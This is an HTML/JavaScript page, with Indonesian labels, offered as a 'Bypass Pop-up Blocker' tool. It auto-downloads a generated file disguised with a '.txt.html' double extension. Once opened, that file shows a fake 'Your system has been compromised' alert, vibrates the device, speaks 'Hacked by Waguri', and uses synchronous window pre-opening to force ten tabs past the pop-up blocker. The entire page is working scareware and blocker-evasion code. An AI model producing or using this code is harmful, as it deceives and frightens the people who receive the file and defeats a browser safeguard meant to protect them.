<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Bypass Pop-up Blocker</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
#downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
#downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Bypass Pop-up Blocker</h2>
<p>Memicu banyak tab menggunakan teknik Synchronous Pre-opening.</p>

<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>

<div id="status" role="status">Sistem siap.</div>
<div id="downloads"></div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];
let isProcessing = false;

const speak = (message) => {
    if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const utterance = new SpeechSynthesisUtterance(message);
        utterance.lang = 'id-ID';
        utterance.rate = 1.0;
        window.speechSynthesis.speak(utterance);
    }
};

const prepareMimeBlobAsync = (i) => {
    return new Promise((resolve) => {
        queueMicrotask(() => {
            const payloadText = "<!DOCTYPE html>" +
            "<html>" +
            "<head><meta charset='UTF-8'><title>SYSTEM ALERT</title></head>" +
            "<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
            "<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
            "<h1 style='font-size:70px;color:#f00;text-shadow:0 0 30px #f00;letter-spacing:8px;animation:pulse 0.5s infinite'>SYSTEM ALERT</h1>" +
            "<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
            "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
            "<p style='font-size:14px;color:#ff0;margin-top:20px;font-weight:bold;' id='status'>Click anywhere on the screen to close this alert.</p>" +
            "</div>" +
            "<style>" +
            "@keyframes pulse { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:0.5; transform:scale(1.05); } }" +
            "body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.05) 0px, rgba(0,255,0,0.05) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
            "</style>" +
            "<script>" +
            "(function(){" +
            "\"use strict\";" +

            "var sudah = false;" +
            "var targetTab = 10;" + // Jumlah tab
            "var dipicu = 0;" +
            "var tabs = [];" + // Menyimpan referensi tab

            // Fungsi untuk memicu TTS & Getar
            "function efekHacker(){" +
            "    if (navigator.vibrate) { navigator.vibrate([500, 200, 500, 200, 1000]); }" +
            "    if ('speechSynthesis' in window) {" +
            "        window.speechSynthesis.cancel();" +
            "        var msg = new SpeechSynthesisUtterance('Hacked by Waguri');" +
            "        msg.lang = 'en-US';" +
            "        window.speechSynthesis.speak(msg);" +
            "    }" +
            "}" +

            // Trik Bypass: Buka tab kosong secara sinkron, lalu arahkan
            "function mulai(){" +
            "    if(sudah) return;" +
            "    sudah = true;" +
            "    efekHacker();" +
            "    " +
            // LANGKAH 1: Buka semua tab kosong secara SINKRON (langsung saat klik)
            "    for (var i = 0; i < targetTab; i++) {" +
            "        try {" +
            "            var w = window.open('about:blank', '_blank');" +
            "            if (w) { tabs.push(w); }" + // Simpan referensi jika berhasil
            "        } catch(e) {}" +
            "    }" +
            "    " +
            // LANGKAH 2: Arahkan tab ke google.com dengan jeda (Asinkron)
            "    setTimeout(function() {" +
            "        for (var j = 0; j < tabs.length; j++) {" +
            "            try {" +
            "                if (tabs[j] && !tabs[j].closed) {" +
            "                    tabs[j].location.href = 'https://google.com';" +
            "                    dipicu++;" +
            "                    document.getElementById('status').textContent = 'Mengarahkan tab ke-' + dipicu + ' dari ' + targetTab;" +
            "                }" +
            "            } catch(e) {}" +
            "        }" +
            "        document.getElementById('status').textContent = 'Selesai. ' + dipicu + ' tab berhasil dibuka.';" +
            "        document.getElementById('status').style.color = '#0f0';" +
            "    }, 500);" + // Jeda 500ms
            "}" +

            // TRIGGER: Klik di mana saja
            "document.addEventListener('click', mulai);" +
            "document.addEventListener('touchstart', mulai);" +

            "})();" +
            "<\/script>" +
            "</body>" +
            "</html>";
          
            const blob = new Blob([payloadText], { type: "text/html" });
            const url = URL.createObjectURL(blob);
            resolve({ id: i, url: url });
        });
    });
};

const triggerInstantDownload = (fileData) => {
    const link = document.createElement("a");
    link.href = fileData.url;
    link.download = `waguri-file-${fileData.id}.txt.html`; // Ekstensi ganda
    link.textContent = `Download waguri-file.txt.html`;
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};

startBtn.addEventListener("click", () => {
    if (isProcessing) return;
    isProcessing = true;
    startBtn.disabled = true;
    statusDiv.textContent = "Menyiapkan file...";

    speak("Menyiapkan file Bypass.");

    const root = document.documentElement;
    try { if (root.requestFullscreen) root.requestFullscreen(); } catch (e) {}

    setTimeout(async () => {
        try {
            const fileData = await prepareMimeBlobAsync(1);
            activeUrls.push(fileData.url);
            triggerInstantDownload(fileData);
            statusDiv.textContent = "File berhasil diunduh. Buka file .txt.html dan klik layar.";
        } catch(e) {
            statusDiv.textContent = "Gagal: " + e.message;
        }
        isProcessing = false;
        startBtn.disabled = false;
    }, 300);
});
</script>
</body>
</html>
